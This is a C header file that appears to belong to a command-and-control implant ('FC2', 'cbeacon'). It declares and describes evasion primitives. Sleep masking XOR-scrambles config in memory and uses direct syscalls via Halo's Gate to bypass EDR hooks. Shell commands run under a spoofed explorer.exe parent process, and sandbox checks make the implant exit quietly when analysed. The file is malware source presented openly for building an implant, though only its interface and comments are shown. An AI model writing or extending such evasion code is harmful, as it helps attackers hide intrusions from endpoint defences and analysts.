/* evade.h — C implant evasion primitives (P1-6A).
 *
 *  1. sleepmask: Ekko-inspired sleep obfuscation mirroring the Go agent
 *     (internal/payload/agent/sleepmask_windows.go + ekko_sleep_windows.go):
 *     sensitive config strings live in a VirtualAlloc'd shadow buffer that
 *     is XOR-scrambled with a rolling 32-byte key and parked NOACCESS for
 *     the duration of every sleep, then restored. Sleep itself goes through
 *     NtDelayExecution resolved via Halo's Gate (direct syscall, bypassing
 *     user-mode hooks on kernel32!Sleep), with plain Sleep() fallback.
 *  2. ppid spoof: shell tasks spawn under a spoofed parent (explorer.exe
 *     via GetShellWindow) using PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
 *     falling back to _popen semantics on any failure.
 *  3. sandbox checks: tick-acceleration + hw-gate at startup.
 *
 * Honest naming: the per-sleep pass is XOR + NOACCESS (config-xor class),
 * NOT full-image AES. README states the achieved capability, nothing more.
 */
#ifndef FC2_EVADE_H
#define FC2_EVADE_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ---- sandbox gate: 0 = proceed, nonzero = exit quietly ---- */
int evade_sandbox_check(void);

/* ---- sleep mask: init once (uuid may be NULL), then sleep masked ---- */
int sleepmask_init(const char *uuid);
void sleepmask_sleep(DWORD ms);

/* ---- shell exec: PPID-spoofed CreateProcess, _popen fallback inside ----
 * Returns malloc'd output buffer (caller frees), *outlen = bytes. Never NULL
 * on success path; returns "[cbeacon] exec failed" buffer on hard failure,
 * mirroring exec_shell's contract. out_cap bounds total output. */
char *exec_shell_spoofed(const char *cmd, DWORD *outlen, DWORD out_cap);

#ifdef __cplusplus
}
#endif

#endif /* FC2_EVADE_H */
